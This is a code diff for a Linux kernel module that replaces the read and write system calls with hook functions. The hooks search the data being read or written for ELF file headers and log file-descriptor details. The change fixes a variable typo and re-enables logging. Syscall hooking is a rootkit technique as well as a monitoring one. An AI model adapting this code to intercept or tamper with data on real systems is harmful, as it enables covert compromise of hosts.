@@ -4,6 +4,8 @@
 asmlinkage long (*sys_write)(unsigned int fd, const char __user *buf, size_t count);
 asmlinkage long (*sys_read)(unsigned int fd, char __user *buf, size_t count);
 
+const char pattern[4] = {0x7f, 0x45, 0x4c, 0x46};
+
 void hook_read ( unsigned int *fd, char __user *buf, size_t *count )
 {
 
@@ -16,10 +18,11 @@ void hook_write ( unsigned int *fd, const char __user *buf, size_t *count )
     /* Monitor/manipulate sys_write() arguments here */
 }
 
+
 asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
 {
     long ret;
-    char pattern[6] = {0x7f, 0x45, 0x4c, 0x46, 0x02, 0x00};
+    char pattern[4] = {0x7f, 0x45, 0x4c, 0x46};
 
     #if __DEBUG_RW__
     void *debug;
@@ -39,7 +42,7 @@ asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
         else
         {   
               //DEBUG_RW("Intercept reading: fd=%d count=%zu", fd, count);
-              if (memstr(debug, patern, count))
+              if (memstr(debug, pattern, count))
               {   
                 unsigned long i;
                 DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
@@ -72,7 +75,7 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
 
     #if __DEBUG_RW__
     void *debug;
-    char pattern[6] = {0x7f, 0x45, 0x4c, 0x46, 0x02, 0x00};
+    char pattern[4] = {0x7f, 0x45, 0x4c, 0x46};
 
     debug = kmalloc(count, GFP_KERNEL);
     if ( ! debug )
@@ -92,7 +95,7 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
             {   
                 
                 unsigned long i;
-                DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu, buf=\n", fd, count);
+                DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu\n", fd, count);
                 /*
                 for ( i = 0; i < count; i++ )
                 {
@@ -102,6 +105,7 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
                 }
                 DEBUG_RW("\n");
                 //log_fd_info(fd);*/
+                log_fd_info(fd);
             }
             kfree(debug);
         }
